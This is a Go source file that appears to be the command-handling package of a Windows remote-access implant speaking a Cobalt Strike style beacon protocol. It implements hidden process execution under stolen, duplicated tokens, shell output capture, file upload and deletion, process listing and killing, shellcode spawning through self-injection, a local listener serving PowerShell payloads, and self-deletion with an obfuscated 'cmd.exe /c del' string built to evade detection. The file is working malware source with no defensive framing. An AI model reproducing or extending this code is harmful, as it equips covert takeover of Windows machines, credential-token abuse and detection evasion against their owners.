package packet

import (
	"bytes"
	"encoding/binary"
	"errors"
	"fmt"
	"github.com/shirou/gopsutil/process"
	"golang.org/x/sys/windows"
	"io/ioutil"
	"main/sysinfo"
	"main/util"
	"net"
	"os"
	"path/filepath"
	//"runtime"
	"strconv"
	"strings"
	"syscall"
	"unicode/utf16"
	"unsafe"
)

const (
	CALLBACK_OUTPUT            = 0
	CALLBACK_KEYSTROKES        = 1
	CALLBACK_FILE              = 2
	CALLBACK_SCREENSHOT        = 3
	CALLBACK_CLOSE             = 4
	CALLBACK_READ              = 5
	CALLBACK_CONNECT           = 6
	CALLBACK_PING              = 7
	CALLBACK_FILE_WRITE        = 8
	CALLBACK_FILE_CLOSE        = 9
	CALLBACK_PIPE_OPEN         = 10
	CALLBACK_PIPE_CLOSE        = 11
	CALLBACK_PIPE_READ         = 12
	CALLBACK_POST_ERROR        = 13
	CALLBACK_PIPE_PING         = 14
	CALLBACK_TOKEN_STOLEN      = 15
	CALLBACK_TOKEN_GETUID      = 16
	CALLBACK_PROCESS_LIST      = 17
	CALLBACK_POST_REPLAY_ERROR = 18
	CALLBACK_PWD               = 19
	CALLBACK_JOBS              = 20
	CALLBACK_HASHDUMP          = 21
	CALLBACK_PENDING           = 22
	CALLBACK_ACCEPT            = 23
	CALLBACK_NETVIEW           = 24
	CALLBACK_PORTSCAN          = 25
	CALLBACK_DEAD              = 26
	CALLBACK_SSH_STATUS        = 27
	CALLBACK_CHUNK_ALLOCATE    = 28
	CALLBACK_CHUNK_SEND        = 29
	CALLBACK_OUTPUT_OEM        = 30
	CALLBACK_ERROR             = 31
	CALLBACK_OUTPUT_UTF8       = 32
)

const (
	CMD_TYPE_SLEEP        = 4
	CMD_TYPE_PAUSE        = 47
	CMD_TYPE_SHELL        = 78
	CMD_TYPE_UPLOAD_START = 10
	CMD_TYPE_UPLOAD_LOOP  = 67
	CMD_TYPE_DOWNLOAD     = 11
	CMD_TYPE_EXIT         = 3
	CMD_TYPE_CD           = 5
	CMD_TYPE_PWD          = 39
	CMD_TYPE_FILE_BROWSE  = 53

	CMD_TYPE_SPAWN_X64                  = 44
	CMD_TYPE_SPAWN_X86                  = 1
	CMD_TYPE_EXECUTE                    = 12
	CMD_TYPE_GETUID                     = 27
	CMD_TYPE_STEAL_TOKEN                = 31
	CMD_TYPE_PS                         = 32
	CMD_TYPE_KILL                       = 33
	CMD_TYPE_DRIVES                     = 55
	CMD_TYPE_RUNAS                      = 38
	CMD_TYPE_MKDIR                      = 54
	CMD_TYPE_RM                         = 56
	CMD_TYPE_CP                         = 73
	CMD_TYPE_MV                         = 74
	CMD_TYPE_REV2SELF                   = 28
	CMD_TYPE_MAKE_TOKEN                 = 49
	CMD_TYPE_PIPE                       = 40
	CMD_TYPE_PORTSCAN_X86               = 89
	CMD_TYPE_PORTSCAN_X64               = 90
	CMD_TYPE_KEYLOGGER                  = 101
	CMD_TYPE_EXECUTE_ASSEMBLY_X64       = 88
	CMD_TYPE_EXECUTE_ASSEMBLY_X86       = 87
	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X64 = 71
	CMD_TYPE_EXECUTE_ASSEMBLY_TOKEN_X86 = 70
	CMD_TYPE_IMPORT_POWERSHELL          = 37
	CMD_TYPE_POWERSHELL_PORT            = 79
	CMD_TYPE_INJECT_X64                 = 43
	CMD_TYPE_INJECT_X86                 = 9
)

func ParseCommandShell(b []byte) (string, []byte, error) {
	buf := bytes.NewBuffer(b)
	pathLenBytes := make([]byte, 4)
	_, err := buf.Read(pathLenBytes)
	if err != nil {
		return "", nil, err
	}
	pathLen := ReadInt(pathLenBytes)
	path := make([]byte, pathLen)
	_, err = buf.Read(path)
	if err != nil {
		return "", nil, err
	}

	cmdLenBytes := make([]byte, 4)
	_, err = buf.Read(cmdLenBytes)
	if err != nil {
		return "", nil, err
	}

	cmdLen := ReadInt(cmdLenBytes)
	cmd := make([]byte, cmdLen)
	buf.Read(cmd)

	envKey := strings.ReplaceAll(string(path), "%", "")
	app := os.Getenv(envKey)
	return app, cmd, nil
}

func Shell(path string, args []byte, Token uintptr) ([]byte, error) {
	return Run(append([]byte(path), args...), Token)
}

func ParseCommandUpload(b []byte) ([]byte, []byte) {
	buf := bytes.NewBuffer(b)
	filePathLenBytes := make([]byte, 4)
	buf.Read(filePathLenBytes)
	filePathLen := ReadInt(filePathLenBytes)
	filePath := make([]byte, filePathLen)
	buf.Read(filePath)
	fileContent := buf.Bytes()
	return filePath, fileContent

}

func Upload(filePath string, fileContent []byte) ([]byte, error) {
	fp, err := os.OpenFile(filePath, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return nil, errors.New("file create err: " + err.Error())
	}
	defer fp.Close()
	offset, err := fp.Write(fileContent)
	if err != nil {
		return nil, errors.New("file write err: " + err.Error())
	}
	return []byte("success, the offset is: " + strconv.Itoa(offset)), nil
}

func ChangeCurrentDir(path []byte) ([]byte, error) {
	err := os.Chdir(string(path))
	if err != nil {
		return nil, err
	}
	return []byte("changing directory success"), nil
}
func GetCurrentDirectory() ([]byte, error) {
	pwd, err := os.Getwd()
	result, err := filepath.Abs(pwd)
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func File_Browse(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	dirPathLenBytes := make([]byte, 4)

	_, err := buf.Read(pendingRequest)
	if err != nil {
		return nil, err
	}
	_, err = buf.Read(dirPathLenBytes)
	if err != nil {
		return nil, err
	}

	dirPathLen := binary.BigEndian.Uint32(dirPathLenBytes)
	dirPathBytes := make([]byte, dirPathLen)
	_, err = buf.Read(dirPathBytes)
	if err != nil {
		return nil, err
	}

	// list files
	dirPathStr := strings.ReplaceAll(string(dirPathBytes), "\\", "/")
	dirPathStr = strings.ReplaceAll(dirPathStr, "*", "")

	// build string for result
	/*
	   /Users/xxxx/Desktop/dev/deacon/*
	   D       0       25/07/2020 09:50:23     .
	   D       0       25/07/2020 09:50:23     ..
	   D       0       09/06/2020 00:55:03     cmd
	   D       0       20/06/2020 09:00:52     obj
	   D       0       18/06/2020 09:51:04     Util
	   D       0       09/06/2020 00:54:59     bin
	   D       0       18/06/2020 05:15:12     config
	   D       0       18/06/2020 13:48:07     crypt
	   D       0       18/06/2020 06:11:19     Sysinfo
	   D       0       18/06/2020 04:30:15     .vscode
	   D       0       19/06/2020 06:31:58     packet
	   F       272     20/06/2020 08:52:42     deacon.csproj
	   F       6106    26/07/2020 04:08:54     Program.cs
	*/
	fileInfo, err := os.Stat(dirPathStr)
	if err != nil {
		return nil, err
	}
	modTime := fileInfo.ModTime()
	currentDir := fileInfo.Name()

	absCurrentDir, err := filepath.Abs(currentDir)
	if err != nil {
		return nil, err
	}
	modTimeStr := modTime.Format("02/01/2006 15:04:05")
	resultStr := ""
	if dirPathStr == "./" {
		resultStr = fmt.Sprintf("%s/*", absCurrentDir)
	} else {
		resultStr = fmt.Sprintf("%s", string(dirPathBytes))
	}
	resultStr += fmt.Sprintf("\nD\t0\t%s\t.", modTimeStr)
	resultStr += fmt.Sprintf("\nD\t0\t%s\t..", modTimeStr)
	files, err := ioutil.ReadDir(dirPathStr)
	for _, file := range files {
		modTimeStr = file.ModTime().Format("02/01/2006 15:04:05")

		if file.IsDir() {
			resultStr += fmt.Sprintf("\nD\t0\t%s\t%s", modTimeStr, file.Name())
		} else {
			resultStr += fmt.Sprintf("\nF\t%d\t%s\t%s", file.Size(), modTimeStr, file.Name())
		}
	}

	return util.BytesCombine(pendingRequest, []byte(resultStr)), nil

}

func Execute(b []byte, Token uintptr) ([]byte, error) {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	sI.ShowWindow = windows.SW_HIDE

	program, _ := syscall.UTF16PtrFromString(string(b))

	var err error
	var result uintptr
	//fmt.Println(Token)
	var NewToken windows.Token
	if Token != 0 {

		result, _, err = DuplicateTokenEx.Call(Token, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewToken)))
		if result != 1 {
			fmt.Println("[-] DuplicateTokenEx() error:", err)
			return nil, errors.New("[-] DuplicateTokenEx() error:" + err.Error())
		} else {
			fmt.Println("[+] DuplicateTokenEx() success")
		}

		result, _, err = CreateProcessWithTokenW.Call(
			uintptr(NewToken),
			LOGON_WITH_PROFILE,
			uintptr(0),
			uintptr(unsafe.Pointer(program)),
			windows.CREATE_NO_WINDOW,
			uintptr(0),
			uintptr(0),
			uintptr(unsafe.Pointer(&sI)),
			uintptr(unsafe.Pointer(&pI)))
		if result != 1 {
			fmt.Println("[-] CreateProcessWithTokenW() error:", err)
			return nil, errors.New("[-] CreateProcessWithTokenW() error:" + err.Error())
		} else {
			fmt.Println("[+] CreateProcessWithTokenW() success")
		}
		if err != nil && err.Error() != ("The operation completed successfully.") {
			fmt.Println(err)
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	} else {
		err = windows.CreateProcess(
			nil,
			program,
			nil,
			nil,
			true,
			windows.CREATE_NO_WINDOW,
			nil,
			nil,
			&sI,
			&pI)
		if err != nil {
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	}

	return []byte("success execute " + string(b)), nil
}

func GetUid() ([]byte, error) {
	result, err := sysinfo.GetUsername()
	if err != nil {
		return nil, err
	}
	return []byte(result), nil
}

func Run(b []byte, Token uintptr) ([]byte, error) {
	var (
		sI windows.StartupInfo
		pI windows.ProcessInformation

		hWPipe windows.Handle
		hRPipe windows.Handle
	)

	sa := windows.SecurityAttributes{
		Length:             uint32(unsafe.Sizeof(windows.SecurityAttributes{})),
		SecurityDescriptor: nil,
		InheritHandle:      1, //true
	}

	err := windows.CreatePipe(&hRPipe, &hWPipe, &sa, 0)
	if err != nil {
		return nil, err
	}

	sI.Flags = windows.STARTF_USESTDHANDLES
	sI.StdErr = hWPipe
	sI.StdOutput = hWPipe
	sI.ShowWindow = windows.SW_HIDE

	program, _ := windows.UTF16PtrFromString(string(b))

	//Token :=GetCurrentProcessToken()

	var result uintptr
	//fmt.Println(Token)
	var NewToken windows.Token
	if Token != 0 {

		result, _, err = DuplicateTokenEx.Call(Token, MAXIMUM_ALLOWED, uintptr(0), SecurityImpersonation, TokenPrimary, uintptr(unsafe.Pointer(&NewToken)))
		if result != 1 {
			fmt.Println("[-] DuplicateTokenEx() error:", err)
			return nil, errors.New("[-] DuplicateTokenEx() error:" + err.Error())
		} else {
			fmt.Println("[+] DuplicateTokenEx() success")
		}

		result, _, err = CreateProcessWithTokenW.Call(
			uintptr(NewToken),
			LOGON_WITH_PROFILE,
			uintptr(0),
			uintptr(unsafe.Pointer(program)),
			windows.CREATE_NO_WINDOW,
			uintptr(0),
			uintptr(0),
			uintptr(unsafe.Pointer(&sI)),
			uintptr(unsafe.Pointer(&pI)))
		if result != 1 {
			fmt.Println("[-] CreateProcessWithTokenW() error:", err)
			return nil, errors.New("[-] CreateProcessWithTokenW() error:" + err.Error())
		} else {
			fmt.Println("[+] CreateProcessWithTokenW() success")
		}
		if err != nil && err.Error() != ("The operation completed successfully.") {
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	} else {
		err = windows.CreateProcess(
			nil,
			program,
			nil,
			nil,
			true,
			windows.CREATE_NO_WINDOW,
			nil,
			nil,
			&sI,
			&pI)
		if err != nil {
			return nil, errors.New("could not spawn " + string(b) + " " + err.Error())
		}
	}

	_, err = windows.WaitForSingleObject(pI.Process, 5*1000)
	if err != nil {
		return nil, errors.New("[-] WaitForSingleObject(Process) error : " + err.Error())
	}
	_, err = windows.WaitForSingleObject(pI.Process, 5*1000)
	if err != nil {
		return nil, errors.New("[-] WaitForSingleObject(Thread) error : " + err.Error())
	}

	buf := make([]byte, 10*8192+1)
	//var done uint32 = 4096
	var read windows.Overlapped
	err = windows.ReadFile(hRPipe, buf, nil, &read)
	if err != nil {
		return nil, err
	}

	//fmt.Printf("buf:%s\n", buf[:read.InternalHigh])

	err = windows.CloseHandle(pI.Process)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(pI.Thread)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hWPipe)
	if err != nil {
		return nil, err
	}
	err = windows.CloseHandle(hRPipe)
	if err != nil {
		return nil, err
	}

	return buf[:read.InternalHigh], nil
}

func Mkdir(b []byte) ([]byte, error) {
	if PathExists(string(b)) {
		return nil, errors.New("Directory exists")
	}
	err := os.Mkdir(string(b), os.ModePerm)
	if err != nil {
		return nil, errors.New("Mkdir failed")
	}
	return []byte("Mkdir success: " + string(b)), nil
}

func PathExists(path string) bool {
	_, err := os.Stat(path)
	if err == nil {
		return true
	}
	if os.IsNotExist(err) {
		return false
	}
	return false
}

func Drives() ([]byte, error) {
	n, err := windows.GetLogicalDriveStrings(0, nil)
	if err != nil {
		return nil, err
	}
	a := make([]uint16, n)
	_, err = windows.GetLogicalDriveStrings(n, &a[0])
	if err != nil {
		return nil, err
	}
	s := string(utf16.Decode(a))
	arr := strings.Split(strings.TrimRight(s, "\x00"), "\x00")
	s = ""
	for _, aa := range arr {
		s += aa + " "
	}
	return []byte(s), nil
}

func Remove(b []byte) ([]byte, error) {
	Path := strings.ReplaceAll(string(b), "\\", "/")
	err := os.RemoveAll(Path)
	if err != nil {
		return nil, errors.New("Remove failed")
	}
	return []byte("Remove " + string(b) + " success"), nil
}

func Copy(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	arg, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	bytesRead, err := ioutil.ReadFile(src)
	if err != nil {
		return nil, err
	}
	fp, err := os.OpenFile(dest, os.O_APPEND|os.O_CREATE|os.O_WRONLY, os.ModePerm)
	if err != nil {
		return nil, err
	}
	defer fp.Close()
	_, err = fp.Write(bytesRead)
	if err != nil {
		return nil, err
	}

	return []byte("Copy " + src + " to " + dest + " success"), nil
}

func Move(b []byte) ([]byte, error) {
	buf := bytes.NewBuffer(b)
	arg, err := util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	src := string(arg)
	arg, err = util.ParseAnArg(buf)
	if err != nil {
		return nil, err
	}
	dest := string(arg)
	err = os.Rename(src, dest)
	if err != nil {
		return nil, err
	}

	return []byte("Move " + src + " to " + dest + " success"), nil
}

func PowershellImport(b []byte) ([]byte, error) {
	return b, nil
}

func PowershellPort(portByte []byte, b []byte) ([]byte, error) {

	port := ReadShort(portByte)
	go func() {
		listen, err := net.Listen("tcp", "127.0.0.1:"+strconv.Itoa(int(port)))
		if err != nil {
			ErrorProcess(errors.New("listen failed, err: " + err.Error()))
			return
		}
		conn, err := listen.Accept()
		if err != nil {
			ErrorProcess(errors.New("accept failed, err: " + err.Error()))
			return
		}

		httpHeader := fmt.Sprintf("HTTP/1.1 200 OK\r\nContent-Type: application/octet-stream\r\nContent-Length: %d\r\n\r\n", len(b))
		receive := make([]byte, 1024)
		_, _ = conn.Read(receive)
		_, _ = conn.Write([]byte(httpHeader))
		_, _ = conn.Write(b)
		_ = conn.Close()
		err = listen.Close()
		if err != nil {
			ErrorProcess(errors.New("close failed, err: " + err.Error()))
			return
		}

	}()

	return []byte("Hold on"), nil

}

func Spawn_X86(shellcode []byte) ([]byte, error) {
	//return Spawn_nt(shellcode,config.Spawnto_x86)
	return InjectSelf(shellcode)
}

func Spawn_X64(shellcode []byte) ([]byte, error) {
	//return Spawn_APC(shellcode,config.Spawnto_x64)
	return InjectSelf(shellcode)
}

func ListProcess(b []byte) ([]byte, error) {
	/*err := enableSeDebugPrivilege()
	if err != nil {
		fmt.Println("SeDebugPrivilege Wrong.")
	}*/
	buf := bytes.NewBuffer(b)
	//resultStr := ""
	pendingRequest := make([]byte, 4)
	_, err := buf.Read(pendingRequest)
	if err != nil {
		return nil, err
	}

	processes, err := process.Processes()
	if err != nil {
		return nil, err
	}
	result := fmt.Sprintf("\n%s\t\t\t%s\t\t\t%s\t\t\t%s\t\t\t%s", "Process Name", "pPid", "pid", "Arch", "User")
	for _, p := range processes {
		pid := p.Pid
		parent, _ := p.Parent()
		if parent == nil {
			continue
		}
		pPid := parent.Pid
		name, _ := p.Name()
		owner, _ := p.Username()
		sessionId := sysinfo.GetProcessSessionId(pid)
		var arc bool
		var archString string
		IsX64, err := sysinfo.IsPidX64(uint32(pid))
		if err != nil {
			return nil, err
		}
		if arc == IsX64 {
			archString = "x64"
		} else {
			archString = "x86"
		}

		result += fmt.Sprintf("\n%s\t%d\t%d\t%s\t%s\t%d", name, pPid, pid, archString, owner, sessionId)
	}

	//return append(b,[]byte(result)...)
	//return []byte(result), nil
	return util.BytesCombine(pendingRequest, []byte(result)), nil
}

func KillProcess(pid uint32) ([]byte, error) {
	/*err := syscall.Kill(int(pid), 9)
	if err != nil {
		return nil, errors.New("process" + strconv.Itoa(int(pid)) + "not found")
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil*/

	proc, err := windows.OpenProcess(windows.PROCESS_TERMINATE, false, pid)
	if err != nil {
		return nil, err
	}
	err = windows.TerminateProcess(proc, 0)
	if err != nil {
		return nil, err
	}
	return []byte("kill " + strconv.Itoa(int(pid)) + " success"), nil
}

func DeleteSelf() ([]byte, error) {
	var sI windows.StartupInfo
	var pI windows.ProcessInformation
	sI.ShowWindow = windows.SW_HIDE

	filename, err := os.Executable()
	if err != nil {
		return nil, err
	}
	program, _ := syscall.UTF16PtrFromString("c" + "m" + "d" + "." + "e" + "x" + "e" + " /c" + " d" + "e" + "l " + filename)
	err = windows.CreateProcess(
		nil,
		program,
		nil,
		nil,
		true,
		windows.CREATE_NO_WINDOW,
		nil,
		nil,
		&sI,
		&pI)
	if err != nil {
		return nil, errors.New("could not delete " + filename + " " + err.Error())
	}
	err = windows.SetPriorityClass(pI.Process, windows.IDLE_PRIORITY_CLASS)
	if err != nil {
		return nil, err
	}
	return []byte("success delete"), nil

}
